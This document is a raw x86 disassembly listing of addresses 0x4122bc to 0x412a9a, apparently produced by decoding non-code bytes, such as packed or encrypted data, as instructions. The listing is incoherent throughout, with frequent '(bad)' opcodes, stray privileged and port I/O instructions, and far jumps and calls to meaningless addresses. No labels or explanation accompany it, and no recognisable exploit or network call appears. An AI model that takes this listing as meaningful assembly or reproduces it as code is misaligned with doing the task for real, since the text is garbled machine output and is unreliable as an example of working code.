  4122bc:	data16 sub al,BYTE PTR [esi+0x65e84c4f]
  4122c3:	jb     0x41228d
  4122c5:	xchg   ebx,eax
  4122c6:	sbb    ch,dh
  4122c8:	pop    edi
  4122c9:	jle    0x412262
  4122cb:	adc    edx,DWORD PTR [edi]
  4122cd:	arpl   sp,bx
  4122cf:	ror    BYTE PTR [ebx],cl
  4122d1:	dec    ebx
  4122d2:	or     al,0x43
  4122d4:	mov    eax,0x8b614ca3
  4122d9:	iret   
  4122da:	dec    edi
  4122db:	aaa    
  4122dc:	mov    eax,ds:0xd9d74f4e
  4122e1:	mov    DWORD PTR [esi-0x5d],esp
  4122e4:	cmc    
  4122e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e6:	mov    ecx,0xf690af6c
  4122eb:	xor    edx,esi
  4122ed:	jns    0x4122b4
  4122ef:	xchg   ebx,eax
  4122f0:	cwde   
  4122f1:	hlt    
  4122f2:	xor    eax,DWORD PTR cs:[ebp-0x49]
  4122f6:	les    edi,FWORD PTR [ebx]
  4122f8:	lahf   
  4122f9:	cmc    
  4122fa:	mov    ds:0x3180efde,eax
  4122ff:	or     DWORD PTR [eax-0x36],edi
  412302:	mov    edx,0x9718eddd
  412307:	inc    edx
  412308:	mov    BYTE PTR [ebx+0x4be91c90],dh
  41230e:	mov    al,ds:0xac69bb2
  412313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412314:	mov    eax,ds:0x1d0eda14
  412319:	test   edx,0xf4d29aa5
  41231f:	ins    BYTE PTR es:[edi],dx
  412320:	push   0xc7439633
  412325:	mov    eax,0x568b3e88
  41232a:	mov    bl,0x84
  41232c:	test   al,0x2
  41232e:	mov    edx,0xc615dc05
  412333:	and    DWORD PTR [edi],ebp
  412335:	dec    esp
  412336:	cmp    al,0xb1
  412338:	shl    DWORD PTR [ecx-0x14],1
  41233b:	cmp    DWORD PTR [edx],0x49186f89
  412341:	fisubr DWORD PTR [eax+0x19]
  412344:	pusha  
  412345:	add    eax,0x5942c65a
  41234a:	mov    ah,0xf6
  41234c:	jle    0x4122df
  41234e:	mov    bl,0x85
  412350:	stos   BYTE PTR es:[di],al
  412352:	inc    esp
  412353:	cmp    BYTE PTR [ebx],ch
  412355:	pop    ebx
  412356:	arpl   WORD PTR es:[edx],bx
  412359:	lock (bad) [edi-0x1c334d86]
  412360:	(bad)  
  412361:	cmc    
  412362:	sti    
  412363:	jp     0x4123c0
  412365:	push   ebp
  412366:	sub    BYTE PTR [edx-0x6a],bl
  412369:	pop    esp
  41236a:	or     ch,BYTE PTR [esi+ecx*8+0x37]
  41236e:	jbe    0x4123ba
  412370:	into   
  412371:	(bad)  
  412372:	out    0xba,eax
  412374:	jno    0x41234b
  412376:	push   0xffffff92
  412378:	mov    ch,0x26
  41237a:	ins    BYTE PTR es:[edi],dx
  41237b:	sub    ah,0x6e
  41237e:	push   0x2dccebb9
  412383:	ss jb  0x412342
  412386:	push   edx
  412387:	clc    
  412388:	sbb    al,0x8f
  41238a:	and    DWORD PTR [esi-0x1f],esp
  41238d:	adc    al,0xa3
  41238f:	daa    
  412390:	imul   ecx,ebx,0xea40716e
  412396:	mov    eax,ds:0xe4bcaf2e
  41239b:	jg     0x412374
  41239d:	xlat   BYTE PTR ds:[ebx]
  41239e:	shl    dl,cl
  4123a0:	push   esi
  4123a1:	adc    bh,BYTE PTR [edx-0x4]
  4123a4:	aaa    
  4123a5:	adc    al,0xdb
  4123a7:	inc    esi
  4123a8:	adc    BYTE PTR [ecx],dl
  4123aa:	dec    eax
  4123ab:	lahf   
  4123ac:	jle    0x412359
  4123ae:	call   0xc70385ef
  4123b3:	fadd   DWORD PTR [edi]
  4123b5:	fwait
  4123b6:	stos   DWORD PTR es:[edi],eax
  4123b7:	xchg   ebx,eax
  4123b8:	jecxz  0x412392
  4123ba:	mov    ch,0x4c
  4123bc:	push   cs
  4123bd:	ja     0x412362
  4123bf:	or     eax,0x72433560
  4123c4:	mov    edx,0xd324cdc9
  4123c9:	aad    0x7f
  4123cb:	out    0xd3,eax
  4123cd:	icebp  
  4123ce:	ins    BYTE PTR es:[edi],dx
  4123cf:	push   cs
  4123d0:	nop
  4123d1:	lods   eax,DWORD PTR ds:[esi]
  4123d2:	(bad)  
  4123d3:	call   0x35ddf8e6
  4123d8:	dec    edx
  4123d9:	enter  0xca58,0x4c
  4123dd:	ss dec edx
  4123df:	cmp    al,0x17
  4123e1:	sbb    edx,DWORD PTR [edi-0x57]
  4123e4:	cld    
  4123e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123e6:	int    0x9e
  4123e8:	or     dl,al
  4123ea:	int    0x6c
  4123ec:	sbb    eax,0x7c129384
  4123f1:	jo     0x412452
  4123f3:	add    eax,0xaf648319
  4123f8:	mov    ds:0x60fa3e9f,al
  4123fd:	pop    ecx
  4123fe:	dec    esi
  4123ff:	pop    edx
  412400:	imul   ecx,DWORD PTR [ecx],0x4d
  412403:	dec    ecx
  412404:	enter  0x89f4,0xac
  412408:	dec    eax
  412409:	popf   
  41240a:	inc    DWORD PTR [ebx-0x6a6df0e3]
  412410:	test   eax,0x77e6e421
  412415:	(bad)  
  412416:	xor    eax,0x73a1c2c5
  41241b:	dec    esi
  41241c:	cmp    al,0x37
  41241e:	(bad)  [ebx]
  412420:	vsqrtsd xmm3,xmm7,QWORD PTR [esi-0x2f]
  412425:	jecxz  0x4123d3
  412427:	mov    bh,0x3b
  412429:	sub    al,BYTE PTR ds:0x4ba556db
  41242f:	mov    ah,0xab
  412431:	loope  0x412443
  412433:	xchg   BYTE PTR cs:[ebx],dl
  412436:	cmc    
  412437:	xchg   ecx,eax
  412438:	and    ebx,DWORD PTR [ecx]
  41243a:	mov    BYTE PTR [edi-0x5e06bb2e],bh
  412440:	adc    DWORD PTR [ebx*2+0x599a1a72],esp
  412447:	xchg   ebx,eax
  412448:	pop    esi
  412449:	js     0x4124ba
  41244b:	es add ecx,ebx
  41244e:	hlt    
  41244f:	xchg   edi,eax
  412450:	adc    DWORD PTR [ebp-0x1a],eax
  412453:	fcmovu st,st(6)
  412455:	inc    ebp
  412456:	cmp    DWORD PTR [ebx-0x50],ecx
  412459:	xchg   ebx,eax
  41245a:	fcom   QWORD PTR [esi]
  41245c:	push   0x65ee0f10
  412461:	sbb    DWORD PTR [edx+0x6e],0xffffffef
  412465:	mov    cl,0x2b
  412467:	icebp  
  412468:	jnp    0x4124a6
  41246a:	aam    0x57
  41246c:	xchg   esp,eax
  41246d:	mov    ch,0x85
  41246f:	dec    esp
  412470:	movd   DWORD PTR [ecx],mm0
  412473:	or     dl,BYTE PTR [ebx-0x1d76b214]
  412479:	sub    ch,0xdf
  41247c:	stos   BYTE PTR es:[edi],al
  41247d:	push   ecx
  41247e:	xchg   edx,eax
  41247f:	xchg   esi,eax
  412480:	mov    bl,0x67
  412482:	xlat   BYTE PTR ds:[ebx]
  412483:	retw   0x1c7c
  412487:	pop    ds
  412488:	fbstp  TBYTE PTR [edx]
  41248a:	test   eax,0xfd0c9e25
  41248f:	(bad)  
  412491:	mov    esp,0xda800698
  412496:	mov    al,ds:0x1944fd67
  41249b:	scas   al,BYTE PTR es:[edi]
  41249c:	pop    esp
  41249e:	jae    0x412451
  4124a0:	sbb    BYTE PTR ds:0x454941d6,0x45
  4124a7:	jns    0x4124ed
  4124a9:	pop    ss
  4124aa:	pop    es
  4124ab:	sar    BYTE PTR [edi+0x5c],0x81
  4124af:	ins    DWORD PTR es:[edi],dx
  4124b0:	and    BYTE PTR [edx+0xf],ch
  4124b3:	jmp    0x83a493f6
  4124b8:	ins    BYTE PTR es:[edi],dx
  4124b9:	pop    ebp
  4124ba:	xchg   ebx,eax
  4124bb:	mov    dh,BYTE PTR [eax-0x79dd1e46]
  4124c1:	ret    0x1c0f
  4124c4:	test   DWORD PTR [ebx-0x2331ea57],0xb7084e1d
  4124ce:	cld    
  4124cf:	mov    eax,ebp
  4124d1:	inc    ecx
  4124d2:	fs dec edx
  4124d4:	cmp    eax,0xfa153305
  4124d9:	push   ds
  4124da:	test   eax,0x4cd8163b
  4124df:	loopne 0x4124b3
  4124e1:	xor    BYTE PTR [ecx],0x8a
  4124e4:	sbb    eax,0x81bcfef7
  4124e9:	out    dx,al
  4124ea:	adc    DWORD PTR [esi+0x24],0x3b
  4124ee:	fisttp WORD PTR [ecx+0x1e2913af]
  4124f4:	mov    edx,0xb013d7e0
  4124f9:	sub    dl,dl
  4124fb:	ficomp DWORD PTR [edx-0x2]
  4124fe:	pop    ss
  4124ff:	fisub  WORD PTR [ebp-0x33]
  412502:	mov    esi,0x5ef0fb32
  412507:	pop    ecx
  412508:	mov    bl,0xf8
  41250a:	jmp    0x41248d
  41250c:	hlt    
  41250d:	xor    esp,ebp
  41250f:	mov    edx,0x6fde7bda
  412514:	push   edx
  412515:	imul   edi,DWORD PTR [ebp+0x4b],0x4c4a04cb
  41251c:	clc    
  41251d:	out    0x15,al
  41251f:	cdq    
  412520:	xchg   BYTE PTR [edx+0x108a3713],bh
  412526:	mov    DWORD PTR [ebx+0x71e2a1e9],esp
  41252c:	lods   al,BYTE PTR ds:[esi]
  41252d:	push   ds
  41252e:	hlt    
  41252f:	mov    bl,0xfd
  412531:	jbe    0x412587
  412533:	pop    eax
  412534:	xchg   edx,eax
  412535:	outs   dx,DWORD PTR ds:[esi]
  412536:	add    eax,0xe398d9ff
  41253b:	add    BYTE PTR [esi+edi*4+0x635e5b60],0x32
  412543:	imul   ebp,DWORD PTR [esi-0x43d1c474],0x2c
  41254a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41254b:	pop    eax
  41254c:	or     eax,ebx
  41254e:	pop    ebx
  41254f:	xchg   edi,eax
  412550:	aad    0xd2
  412552:	test   BYTE PTR ds:0x6bd29a8,dl
  412558:	ret    
  412559:	xor    bh,0x95
  41255c:	test   DWORD PTR [eax],ebx
  41255e:	sub    dl,bh
  412560:	mov    bh,0xd1
  412562:	out    dx,eax
  412563:	jg     0x412562
  412565:	xchg   edi,eax
  412566:	psubd  mm3,QWORD PTR [esp+ebp*1]
  41256a:	sbb    eax,0x7d82d743
  41256f:	xchg   edx,eax
  412570:	arpl   WORD PTR ds:0x21a7a264,bp
  412576:	or     BYTE PTR [ebx-0x70],ch
  412579:	scas   al,BYTE PTR es:[edi]
  41257a:	and    eax,0x526f4994
  41257f:	lock retf 0x3a5b
  412583:	leave  
  412584:	idiv   BYTE PTR [edi-0x10]
  412587:	ins    BYTE PTR es:[edi],dx
  412588:	push   DWORD PTR [ebp+0x5746be84]
  41258e:	enter  0xdbe6,0xe3
  412592:	adc    edi,DWORD PTR [ebx+0x6e]
  412595:	push   esp
  412596:	jecxz  0x4125d1
  412598:	mov    ecx,0x225d9b65
  41259d:	jns    0x4125b4
  41259f:	adc    eax,0xf756ff05
  4125a4:	int3   
  4125a5:	mov    eax,DWORD PTR [esi+0x4c]
  4125a8:	mov    ds:0xfa552df7,eax
  4125ad:	lods   eax,DWORD PTR ds:[esi]
  4125ae:	add    edi,ebp
  4125b0:	cdq    
  4125b1:	push   ebp
  4125b2:	bound  esi,QWORD PTR [eax-0x38eb4f6a]
  4125b8:	dec    edx
  4125b9:	cmp    edx,DWORD PTR [edx+0x75]
  4125bc:	rol    DWORD PTR [edx],1
  4125be:	mov    ecx,0x23cd022f
  4125c3:	(bad)  
  4125c4:	repnz xor DWORD PTR [esi+0x13],ebp
  4125c8:	in     al,dx
  4125c9:	popa   
  4125ca:	loop   0x4125f5
  4125cc:	push   edi
  4125cd:	and    eax,0x30867bf5
  4125d2:	mov    eax,0x1f90642c
  4125d7:	xor    eax,0xfac75eda
  4125dc:	and    DWORD PTR [ecx+0xb],edi
  4125df:	and    bl,BYTE PTR [esi-0x2a]
  4125e2:	inc    esi
  4125e3:	sub    eax,0x4b2e8031
  4125e8:	lahf   
  4125e9:	int    0xda
  4125eb:	inc    DWORD PTR [edx]
  4125ed:	lahf   
  4125ee:	xor    ebp,ecx
  4125f0:	ins    BYTE PTR es:[edi],dx
  4125f1:	pop    ebx
  4125f2:	fwait
  4125f3:	xchg   ebp,eax
  4125f4:	shr    DWORD PTR [eax-0x1649363e],cl
  4125fa:	dec    edi
  4125fb:	sbb    al,BYTE PTR [edi+0xd]
  4125fe:	ins    DWORD PTR es:[edi],dx
  4125ff:	jmp    0x53ee:0xff367d6b
  412606:	and    bl,BYTE PTR [ebp+0x41]
  412609:	sub    bl,BYTE PTR [eax+0x753c823]
  41260f:	test   al,0x1c
  412611:	xor    al,0x3c
  412613:	pop    ecx
  412614:	pusha  
  412615:	mov    al,0x95
  412617:	in     al,dx
  412618:	int3   
  412619:	mov    ds:0x5f412e46,al
  41261e:	xlat   BYTE PTR ds:[ebx]
  41261f:	dec    BYTE PTR [ebp+0x2a9dcda6]
  412625:	mov    DWORD PTR [ebx-0x7f],ebp
  412628:	push   ss
  412629:	into   
  41262a:	cli    
  41262b:	and    ch,BYTE PTR [ebx+0xec1582a]
  412631:	lods   eax,DWORD PTR ds:[esi]
  412632:	and    cl,bh
  412634:	imul   eax,DWORD PTR [edi-0xf97873f],0x6
  41263b:	xor    bl,al
  41263d:	jbe    0x41268a
  41263f:	mov    edi,0x4db17d56
  412644:	call   0x4810:0x6ca0437d
  41264b:	leave  
  41264c:	daa    
  41264d:	fld    TBYTE PTR [edx]
  41264f:	in     eax,0xfc
  412651:	xchg   BYTE PTR [edx],dh
  412653:	pop    ebp
  412654:	mov    bh,0x1e
  412656:	inc    edi
  412657:	push   es
  412658:	neg    BYTE PTR [ebp-0x5771d468]
  41265e:	cmp    bh,BYTE PTR [eax]
  412660:	mov    eax,ds:0xee0009d1
  412665:	cmp    bl,BYTE PTR [ebp+0x54bf9456]
  41266b:	mov    edi,0xb51e4823
  412670:	lds    edi,FWORD PTR [edi-0x3e520d1b]
  412676:	or     BYTE PTR fs:[eax-0x4e],cl
  41267a:	loopne 0x41264f
  41267c:	in     eax,dx
  41267d:	rol    DWORD PTR [edi+edi*2],cl
  412680:	xchg   ecx,eax
  412681:	jmp    0x4126e7
  412683:	mov    ecx,0xf2f8b04b
  412688:	pop    edx
  412689:	push   ebp
  41268a:	je     0x412677
  41268c:	mov    ch,0x58
  41268e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41268f:	or     DWORD PTR [esi+0x69f4fd42],ecx
  412695:	cmc    
  412696:	stc    
  412697:	mov    ebp,0x6d77c7ab
  41269c:	cs pop esp
  41269e:	clc    
  41269f:	sbb    DWORD PTR [edi],esp
  4126a1:	and    BYTE PTR [edi+0x23],al
  4126a4:	dec    ebp
  4126a5:	mov    ss,WORD PTR [edx-0x59bc77f7]
  4126ab:	into   
  4126ac:	ret    0xa172
  4126af:	push   0x350c4695
  4126b4:	xor    ch,bh
  4126b6:	pop    edi
  4126b7:	jne    0x412709
  4126b9:	mov    bl,cl
  4126bb:	cmp    al,0x57
  4126bd:	and    DWORD PTR [esi+0x5dc28c6b],ebx
  4126c3:	out    dx,eax
  4126c4:	pushf  
  4126c5:	sar    DWORD PTR [ecx-0x75],0xb8
  4126c9:	mov    eax,ds:0xdb767e6e
  4126ce:	xor    al,0x82
  4126d0:	cmp    bl,BYTE PTR [ebp-0x53]
  4126d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d4:	adc    BYTE PTR [edx+0x1e],0x79
  4126d8:	jb     0x4126a4
  4126da:	jbe    0x41270d
  4126dc:	adc    eax,0x6a24d184
  4126e1:	(bad)  
  4126e2:	sbb    ecx,ebx
  4126e4:	ins    BYTE PTR es:[edi],dx
  4126e5:	push   cs
  4126e6:	ds stc 
  4126e8:	jmp    0xc7f6:0xce6a0709
  4126ef:	inc    edi
  4126f0:	popa   
  4126f1:	and    DWORD PTR [esi],edx
  4126f3:	into   
  4126f4:	das    
  4126f5:	mov    dl,BYTE PTR [ecx-0x11]
  4126f8:	fstp   TBYTE PTR [edi]
  4126fa:	fcomp  st(2)
  4126fc:	add    BYTE PTR [ecx-0x3e223f47],dh
  412702:	pusha  
  412703:	jg     0x41275a
  412705:	xchg   ecx,eax
  412706:	mov    al,ds:0x4a0e2260
  41270b:	xor    DWORD PTR [edi+eax*8-0x50025d3e],ecx
  412712:	adc    DWORD PTR [esi],esi
  412714:	div    BYTE PTR [esi]
  412716:	xchg   edi,eax
  412717:	mov    edi,0x3bb76c62
  41271c:	dec    eax
  41271d:	push   esp
  41271e:	iret   
  41271f:	aas    
  412720:	shl    DWORD PTR [edi],1
  412722:	lock jg 0x412788
  412725:	(bad)  
  412726:	pusha  
  412727:	imul   ebx,DWORD PTR [edx+eiz*4-0x71],0x9
  41272c:	or     DWORD PTR [esi+ebp*4],esi
  41272f:	test   al,0x24
  412731:	outs   dx,DWORD PTR ds:[esi]
  412732:	inc    ebp
  412733:	scas   eax,DWORD PTR es:[edi]
  412734:	adc    BYTE PTR [ebx+0x515f8302],0xb7
  41273b:	xor    al,0x67
  41273d:	mov    BYTE PTR ds:0xde74a613,0x49
  412744:	call   0x27cd:0x77cceb1f
  41274b:	mov    ebx,0xeb67be18
  412750:	fdivr  st(6),st
  412752:	cwde   
  412753:	aas    
  412754:	clc    
  412755:	aam    0x40
  412757:	mov    ecx,0xa976ef35
  41275c:	pop    es
  41275d:	cmp    eax,0xd2bbb399
  412762:	sub    ah,BYTE PTR [ebx-0x71]
  412765:	sbb    DWORD PTR [ecx-0x521082be],0x98178eb8
  41276f:	ins    BYTE PTR es:[edi],dx
  412770:	fs cmp ch,BYTE PTR cs:[ebx+0x18b8d3de]
  412778:	mov    BYTE PTR [edi],dl
  41277a:	xor    al,0xdc
  41277c:	fcom   st(6)
  41277e:	shl    edi,cl
  412780:	js     0x412724
  412782:	pop    ebx
  412783:	pop    ebx
  412784:	mov    ch,ah
  412786:	pusha  
  412787:	(bad)  [edx]
  412789:	outs   dx,BYTE PTR ds:[esi]
  41278a:	dec    esp
  41278b:	data16 sti 
  41278d:	(bad)  
  41278e:	(bad)  
  41278f:	jl     0x412729
  412791:	fbld   TBYTE PTR [ebp+edi*1-0x49c194e2]
  412798:	daa    
  412799:	adc    dl,BYTE PTR [edi+0x37d1174c]
  41279f:	pusha  
  4127a0:	lods   al,BYTE PTR ds:[esi]
  4127a1:	mov    ds:0x1b1f7c59,al
  4127a6:	push   0x538f8a5b
  4127ab:	jge    0x4127a3
  4127ad:	nop
  4127ae:	cmovns ebx,esi
  4127b1:	cli    
  4127b2:	adc    al,0xe9
  4127b4:	les    ebx,FWORD PTR [eax-0x5fd6710b]
  4127ba:	mov    ebp,DWORD PTR [eax]
  4127bc:	push   esp
  4127bd:	jnp    0x41283c
  4127bf:	xchg   BYTE PTR [esi+0x6aa41c35],al
  4127c5:	xor    esi,DWORD PTR [eax+0x752cdba1]
  4127cb:	jl     0x412750
  4127cd:	fwait
  4127ce:	mov    bl,BYTE PTR [edx]
  4127d0:	inc    edx
  4127d1:	inc    ebx
  4127d2:	aam    0x68
  4127d4:	jl     0x412820
  4127d6:	fild   WORD PTR [edi-0x36]
  4127d9:	shl    DWORD PTR [esi+ebp*1-0x72ddeaaa],cl
  4127e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e1:	fstp   st(5)
  4127e3:	inc    eax
  4127e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e5:	gs mov esi,0xa077d0ac
  4127eb:	inc    edi
  4127ec:	int    0x91
  4127ee:	dec    edi
  4127ef:	mov    WORD PTR [ebp-0x56e030bc],gs
  4127f5:	(bad)  
  4127f6:	loopne 0x4127a9
  4127f8:	dec    ecx
  4127f9:	mov    ds:0x9ab860a4,eax
  4127fe:	mov    DWORD PTR [esi],edx
  412800:	or     ebp,DWORD PTR [ebx+0x3]
  412803:	cmp    al,0x13
  412805:	in     eax,0x9f
  412807:	es xchg esp,eax
  412809:	cdq    
  41280a:	or     edi,ecx
  41280c:	int3   
  41280d:	dec    esi
  41280e:	jae    0x41279e
  412810:	push   0xffffffd6
  412812:	aam    0x53
  412814:	daa    
  412815:	mov    ds:0x5320982b,eax
  41281a:	mov    ecx,0x29fea812
  41281f:	push   ebx
  412820:	dec    esp
  412821:	mov    DWORD PTR [ecx+0x2e],ebx
  412824:	shl    bh,1
  412826:	cmc    
  412827:	out    dx,eax
  412828:	sahf   
  412829:	cmp    eax,DWORD PTR [ebx+ebx*8]
  41282c:	pop    ecx
  41282d:	or     esp,ebp
  41282f:	xor    al,0x1e
  412831:	sbb    eax,0x6d9858bc
  412836:	out    dx,al
  412837:	shl    BYTE PTR [edx-0x32],cl
  41283a:	mov    ds:0xf1b0db4c,eax
  41283f:	and    ecx,DWORD PTR [eax-0x18ff9672]
  412845:	(bad)  
  412847:	je     0x4128a9
  412849:	sbb    DWORD PTR [ebp+0x77],0x4dfeeab
  412850:	outs   dx,BYTE PTR ds:[esi]
  412851:	adc    ebx,DWORD PTR [ecx+0x58865f6b]
  412857:	or     al,0x46
  412859:	mov    ebp,0x1b0b5231
  41285e:	pop    ecx
  41285f:	not    BYTE PTR [ecx-0x20]
  412862:	push   ds
  412863:	cli    
  412864:	pop    esi
  412865:	jmp    0x4127f3
  412867:	aad    0xe1
  412869:	lea    ebx,[edx-0x4a]
  41286c:	repnz push 0xf5045ee5
  412872:	ficom  DWORD PTR [esi-0x79]
  412875:	(bad)  
  412876:	loop   0x4128c5
  412878:	xor    dl,BYTE PTR [ebp-0x1f9727ef]
  41287e:	mov    ds:0x636ad92b,eax
  412883:	lods   al,BYTE PTR ds:[esi]
  412884:	stos   BYTE PTR es:[edi],al
  412885:	mov    al,0xf5
  412887:	cs (bad) 
  412889:	ret    
  41288a:	mov    ah,0x39
  41288c:	ds pop ebp
  41288e:	sar    BYTE PTR [edx+ebp*8-0x1c2aefc1],0xf0
  412896:	mov    ds:0x13b35078,al
  41289b:	sub    al,0xd5
  41289d:	nop
  41289e:	mov    eax,ds:0x75bf471b
  4128a3:	xor    dl,0xb9
  4128a6:	pop    DWORD PTR [esi]
  4128a8:	xchg   ebp,eax
  4128a9:	xlat   BYTE PTR ds:[ebx]
  4128aa:	pop    edx
  4128ab:	sahf   
  4128ac:	xor    al,0xd7
  4128ae:	or     esi,DWORD PTR [ecx+eax*4+0x5e]
  4128b2:	fcmovnbe st,st(3)
  4128b4:	mov    ecx,DWORD PTR cs:[edi+0x5928651b]
  4128bb:	and    eax,0x8316d75e
  4128c0:	in     al,0x39
  4128c2:	jmp    0x412847
  4128c4:	aad    0x3c
  4128c6:	sub    eax,0xa4e87cdf
  4128cb:	mov    ecx,0x67457b44
  4128d0:	cmp    eax,0xfb5a48a2
  4128d5:	fist   DWORD PTR [ebx+eax*1]
  4128d8:	stos   BYTE PTR es:[edi],al
  4128d9:	mov    edx,0x2091f005
  4128de:	jmp    0xffe2:0x6a92fc2d
  4128e5:	out    0x6e,al
  4128e7:	dec    esi
  4128e8:	cdq    
  4128e9:	cli    
  4128ea:	jne    0x41292d
  4128ec:	mov    ebx,0x2babf535
  4128f1:	pusha  
  4128f2:	ins    DWORD PTR es:[edi],dx
  4128f3:	mov    esp,0x7c37813b
  4128f8:	lea    esi,ss:[eax]
  4128fb:	lods   eax,DWORD PTR ds:[esi]
  4128fc:	fwait
  4128fd:	scas   al,BYTE PTR es:[edi]
  4128fe:	mov    ecx,DWORD PTR [edx]
  412900:	cmp    BYTE PTR [esi+0x7e63f80f],bh
  412906:	inc    edi
  412907:	rcl    BYTE PTR [eax],1
  412909:	cdq    
  41290a:	test   al,0xa
  41290c:	enter  0x3676,0x57
  412910:	xchg   bh,ch
  412912:	mov    eax,0xe690768f
  412917:	adc    DWORD PTR [ecx-0x4298d1ee],eax
  41291d:	sbb    dl,0xcf
  412920:	pushf  
  412921:	jmp    0xfd3c:0xc35236e4
  412928:	pop    es
  412929:	sbb    bl,dl
  41292b:	push   0xd14eb499
  412930:	add    al,0x16
  412932:	fisub  WORD PTR [esi+ebx*8]
  412935:	out    dx,al
  412936:	xlat   BYTE PTR ds:[ebx]
  412937:	adc    bh,dl
  412939:	lock shr DWORD PTR [edx-0x67c9dc9c],0x9b
  412941:	iret   
  412942:	push   esi
  412943:	enter  0x4846,0xa6
  412947:	pop    esp
  412948:	xor    eax,0x31dddfad
  41294d:	out    dx,al
  41294e:	push   0xda5f6c4a
  412953:	arpl   bp,di
  412955:	jge    0x412934
  412957:	imul   BYTE PTR [esi]
  412959:	adc    ah,BYTE PTR [esi]
  41295b:	jmp    0xb9babd7f
  412960:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412962:	pushw  ss
  412964:	pop    esp
  412965:	xchg   esp,eax
  412966:	icebp  
  412967:	faddp  st(1),st
  412969:	jle    0x4129a4
  41296b:	mov    eax,0xaa1d1910
  412970:	mov    edi,0xdcc73d98
  412975:	test   al,0xa2
  412977:	sbb    DWORD PTR [edx+ecx*8+0x40],esi
  41297b:	jnp    0x4129c6
  41297d:	in     eax,dx
  41297e:	sbb    al,0x6b
  412980:	pop    ds
  412981:	into   
  412982:	test   eax,0xb11390e8
  412987:	mov    BYTE PTR [ebp+0x51],dl
  41298a:	push   ebx
  41298b:	cmp    ebp,esp
  41298d:	test   al,0xc0
  41298f:	push   cs
  412990:	mov    dl,0x6b
  412992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412993:	or     eax,0x8b6175ac
  412998:	and    eax,0xffffffc0
  41299b:	mov    ah,0xdc
  41299d:	sbb    al,0xc7
  41299f:	push   esp
  4129a0:	mov    dl,0xe6
  4129a2:	popw   es
  4129a4:	jo     0x41296c
  4129a6:	aaa    
  4129a7:	mov    al,0x7e
  4129a9:	ret    0xf9a4
  4129ac:	hlt    
  4129ad:	push   edx
  4129ae:	retf   0xbb1b
  4129b1:	popa   
  4129b2:	hlt    
  4129b3:	data16 cmc 
  4129b5:	sbb    BYTE PTR [ebp-0x7b],dl
  4129b8:	sub    eax,0xb03feba7
  4129bd:	(bad)  
  4129be:	hlt    
  4129bf:	sub    al,0xbd
  4129c1:	mov    edi,0xd85c0d84
  4129c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129c7:	adc    al,0xcb
  4129c9:	mov    esi,0xfc0841a8
  4129ce:	sub    eax,eax
  4129d0:	mov    edi,ecx
  4129d2:	fisub  DWORD PTR [esi+0x6cf22e37]
  4129d8:	xchg   ecx,eax
  4129d9:	jmp    0x412966
  4129db:	xchg   BYTE PTR [edx-0x2b],bl
  4129de:	inc    ecx
  4129df:	aad    0xbe
  4129e1:	inc    ebp
  4129e2:	fstp   TBYTE PTR [ebp+0x1b]
  4129e5:	js     0x412a08
  4129e7:	cdq    
  4129e8:	and    eax,0xaff157a6
  4129ed:	(bad)  
  4129ee:	(bad)  
  4129ef:	cwde   
  4129f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129f1:	add    ebp,DWORD PTR [ebx]
  4129f3:	mov    eax,ds:0xfb2ce620
  4129f8:	cmp    eax,0x3d7c680b
  4129fd:	shr    BYTE PTR [ebx],cl
  4129ff:	mov    ds,WORD PTR [ecx]
  412a01:	sbb    BYTE PTR [esi],bh
  412a03:	in     al,0xe7
  412a05:	mov    bl,0x68
  412a07:	aam    0xbb
  412a09:	ins    BYTE PTR es:[edi],dx
  412a0a:	daa    
  412a0b:	mov    WORD PTR [edi],cs
  412a0d:	jnp    0x4129a5
  412a0f:	aaa    
  412a10:	sbb    DWORD PTR [ebx+ecx*2],esp
  412a13:	push   esi
  412a14:	pop    ss
  412a15:	das    
  412a16:	les    esi,FWORD PTR [ebp+0x556c0d82]
  412a1c:	push   ds
  412a1d:	jmp    0x412a24
  412a1f:	push   eax
  412a20:	not    DWORD PTR [ecx]
  412a22:	fwait
  412a23:	mov    DWORD PTR [edx+0x3eb9eba8],ecx
  412a29:	fbstp  TBYTE PTR [ebx+eiz*2]
  412a2c:	clc    
  412a2d:	or     DWORD PTR [esi-0x632919a4],0xfffffff1
  412a34:	rcl    dl,cl
  412a36:	neg    DWORD PTR [esi]
  412a38:	(bad)  
  412a39:	repnz xchg ebp,eax
  412a3b:	jae    0x412aa8
  412a3d:	and    al,BYTE PTR [ecx]
  412a3f:	retf   0x68ee
  412a42:	cmp    al,0x97
  412a44:	mov    WORD PTR [edi],ss
  412a46:	lds    esi,FWORD PTR [esi]
  412a48:	pop    ecx
  412a49:	pusha  
  412a4a:	sbb    DWORD PTR [edx-0x38],ebx
  412a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a4e:	dec    ebp
  412a4f:	sbb    bl,BYTE PTR [eax-0x41]
  412a52:	test   DWORD PTR [esi],esi
  412a54:	loope  0x412a26
  412a56:	push   0xffffffdc
  412a58:	stos   DWORD PTR es:[edi],eax
  412a59:	jecxz  0x4129fe
  412a5b:	pushf  
  412a5c:	add    al,0xd3
  412a5e:	popf   
  412a5f:	jl     0x4129ed
  412a61:	cmp    al,0x12
  412a63:	jno    0x412a0f
  412a65:	(bad)  
  412a66:	jmp    0x412ae5
  412a68:	mov    ebp,0xfb73cb13
  412a6d:	adc    al,BYTE PTR [edi-0x36e3e99b]
  412a73:	fsubr  DWORD PTR [edi]
  412a75:	shl    DWORD PTR [esi-0x15475af2],1
  412a7b:	or     al,0x1e
  412a7d:	or     al,0x6d
  412a7f:	xchg   BYTE PTR [ebx+0x16],ch
  412a82:	sub    WORD PTR [ecx+0x2],0xb2e9
  412a88:	call   0xbbc9:0x4b46f4b4
  412a8f:	add    DWORD PTR [edi+0x2b],esi
  412a92:	jg     0x412a92
  412a94:	rcr    BYTE PTR [edx+0x362f518c],1
  412a9a:	enter  0x4b2f,0x4a
